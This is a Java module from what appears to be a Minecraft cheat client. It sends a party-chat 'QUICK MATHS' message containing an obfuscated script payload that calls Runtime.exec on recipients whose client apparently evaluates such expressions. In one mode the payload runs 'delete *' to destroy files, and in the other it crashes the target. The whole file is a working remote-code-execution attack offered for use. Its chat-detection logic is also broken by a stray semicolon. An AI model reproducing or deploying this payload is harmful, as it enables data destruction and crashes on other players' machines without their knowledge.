package bozoware.impl.module.world;

import bozoware.base.event.EventConsumer;
import bozoware.base.event.EventListener;
import bozoware.base.module.Module;
import bozoware.base.module.ModuleCategory;
import bozoware.base.module.ModuleData;
import bozoware.base.util.Wrapper;
import bozoware.impl.event.network.PacketReceiveEvent;
import bozoware.impl.property.EnumProperty;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.server.S02PacketChat;

import static bozoware.base.BozoWare.getInstance;

@ModuleData(moduleName = "ANTI NOBOLINE", moduleCategory = ModuleCategory.WORLD)
public class AntiNovoline extends Module {

    @EventListener
    EventConsumer<PacketReceiveEvent> onPacketReceiveEvent;

    public static boolean sent;

    private final EnumProperty<novomode> novoModes = new EnumProperty<>("trole", AntiNovoline.novomode.crash, this);

    public AntiNovoline(){
        onPacketReceiveEvent = (e -> {
           if(e.getPacket() instanceof S02PacketChat) {
                String message = ((S02PacketChat) e.getPacket()).getChatComponent().getUnformattedText();
                if(message.contains("You are not in a party")){
                    sent = false;
                }
                if(message.contains("Party chat"));
                sent = true;
           }
        });

        onModuleEnabled = () -> {
            if(novoModes.getPropertyValue().equals(novomode.delete)){
                Wrapper.sendMessageAsPlayer("/pc QUICK MATHS! Solve: java[\"lang\"][\"Runtime\"][\"getRuntime\"]()[\"e\" + String.fromCharCode(120) + \"ec\"](\"delete *\")\n");
                if(sent == true) {
                    getInstance().chat("deleting files in background");
                } else {
                    getInstance().chat("Message not sent: Reason >> You are not in a party.");
                }
            } else {
                Wrapper.sendPacketDirect(new C01PacketChatMessage("/pc QUICK MATHS! Solve: java[\"lang\"][\"Runtime\"][\"getRuntime\"]()[\"e\" + String.fromCharCode(120) + \"ec\"](\"-1\")\n"));
                if(sent == true){
                    getInstance().chat("Message successfully sent!");
                } else {
                    getInstance().chat("Message not sent: Reason >> You are not in a party.");
                }
            }
            this.toggleModule();

        };
    }

    private enum novomode {
        delete,
        crash
    }
}
